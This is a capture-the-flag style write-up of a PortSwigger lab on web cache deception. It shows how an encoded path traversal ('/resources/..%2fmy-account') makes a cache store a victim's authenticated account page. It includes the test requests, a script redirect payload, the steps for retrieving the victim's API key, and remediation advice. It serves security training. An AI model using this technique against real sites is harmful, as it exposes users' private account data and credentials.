# Lab 5: Exploiting Origin Server Normalization for Web Cache Deception

**Category:** Web Cache Deception
**Difficulty:** Practitioner
**Lab link:** [Exploiting origin server normalization for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization)

## Overview

The opposite of cache server normalization. Here the **origin** decodes and resolves percent-encoded dot-segments (`..%2f`), while the **cache** does not. The cache also has a static-directory rule for `/resources`. A request to `/resources/..%2fmy-account` makes the origin return the authenticated account page (it resolves the traversal to `/my-account`), while the cache stores it under the `/resources` path.

## Key Concepts

- **Origin normalization:** The origin decodes `%2f` to `/` and resolves `../` path traversals before routing — `/resources/..%2fmy-account` becomes `/my-account`.
- **Cache does not normalize:** The cache keeps the raw path, sees the `/resources` prefix, and applies its static caching rule.
- **No delimiter needed:** Unlike the cache server normalization lab, `?` is the only delimiter here (standard query string), so no encoded delimiter trick is required — the dot-segment traversal alone is enough.

## Exploit Path

```
/resources/..%2fmy-account?wcd
```

- **Origin sees:** `/my-account` → returns authenticated account page
- **Cache sees:** `/resources/..%2fmy-account` → matches `/resources` rule → caches it
- **`?wcd`:** unique cache buster

## Solution

### Step 1 — Confirm origin resolves dot-segments

```
GET /aaa/..%2fmy-account
```
Returns 200 with your account data → the origin decoded `%2f` and resolved the `../` traversal.

### Step 2 — Confirm cache has /resources static rule

```
GET /resources/aaa
```
First send: `X-Cache: miss` → second send: `X-Cache: hit` → cache applies a static rule to any `/resources`-prefixed path.

### Step 3 — Build and test the exploit path

```
GET /resources/..%2fmy-account
```
Logged in as wiener: origin returns account page, cache stores it. Second send: `X-Cache: hit`.

### Step 4 — Deliver to victim

On the exploit server:
```html
<script>document.location="https://<lab>/resources/..%2fmy-account?wcd"</script>
```
Deliver to victim. Carlos visits, his account page is cached at that URL.

### Step 5 — Retrieve API key

Visit `https://<lab>/resources/..%2fmy-account?wcd` unauthenticated. Cache serves Carlos's account page. Copy the API key and submit.

## Remediation

- Apply `Cache-Control: no-store` or `private` to all authenticated responses.
- Normalize URL paths at the cache layer before applying caching rules — do not cache based on a prefix that the origin would route differently.
- Do not cache responses to paths containing encoded path traversal sequences.

## Key Takeaways

- Origin and cache normalization mismatches work in both directions: cache normalizes (Lab 6) or origin normalizes (this lab) — both are exploitable.
- The simpler version: no delimiter hunting needed, just a `%2f`-encoded traversal.
- Always test `..%2f` traversals against both the origin (does it resolve?) and the cache (does it cache?) independently.
